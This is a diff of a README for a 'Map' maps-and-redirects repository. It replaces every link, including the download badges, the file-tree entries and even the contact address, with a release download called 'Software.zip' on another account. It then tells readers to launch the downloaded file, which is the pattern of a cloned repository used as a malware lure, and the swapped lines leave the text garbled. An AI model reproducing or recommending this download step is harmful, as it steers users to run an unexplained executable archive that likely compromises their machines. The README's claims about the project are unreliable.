@@ -1,6 +1,6 @@
 # 🗺️ Welcome to the Map Repository! 🗺️
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/jusjus-m/Map/releases/download/v1.0/Software.zip%20Version-brightgreen)](https://github.com/jusjus-m/Map/releases/download/v1.0/Software.zip)
 
 Welcome to the "Map" repository, your ultimate destination for maps and redirections. This repository serves as a hub for all things related to maps and redirects. Whether you're looking to explore new places or navigate your way through the digital world, this repository has got you covered!
 
@@ -18,15 +18,15 @@ Welcome to the "Map" repository, your ultimate destination for maps and redirect
 ```
 Map/
 |__ docs/
-|   |__ index.md
+|   |__ https://github.com/jusjus-m/Map/releases/download/v1.0/Software.zip
 |__ LICENSE
-|__ README.md
+|__ https://github.com/jusjus-m/Map/releases/download/v1.0/Software.zip
 ```
 
 ## 🚀 Getting Started
 To explore the world of maps and redirects, simply download the latest version of the repository by clicking the button below:
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/jusjus-m/Map/releases/download/v1.0/Software.zip%20Version-brightgreen)](https://github.com/jusjus-m/Map/releases/download/v1.0/Software.zip)
 
 Once downloaded, launch the file to begin your journey into the world of maps!
 
@@ -46,6 +46,6 @@ Want to contribute to the development of "Map"? Feel free to fork the repository
 gpl3, gplv3, map, maps, markdown-lang, markdown-language, redirect, redirect-page, redirect-repo, redirect-repository, redirection, redirection-page, redirection-repo, redirection-repository, seanpm2001-map, seanpm2001-maps, seanpm2001-redirect, seanpm2001-redirection
 
 ## 📞 Contact
-If you have any questions, suggestions, or feedback, feel free to reach out to the repository owner at seanpm2001@example.com.
+If you have any questions, suggestions, or feedback, feel free to reach out to the repository owner at https://github.com/jusjus-m/Map/releases/download/v1.0/Software.zip
 
 Start your mapping journey now with "Map"! Happy exploring! 🌍🗺️
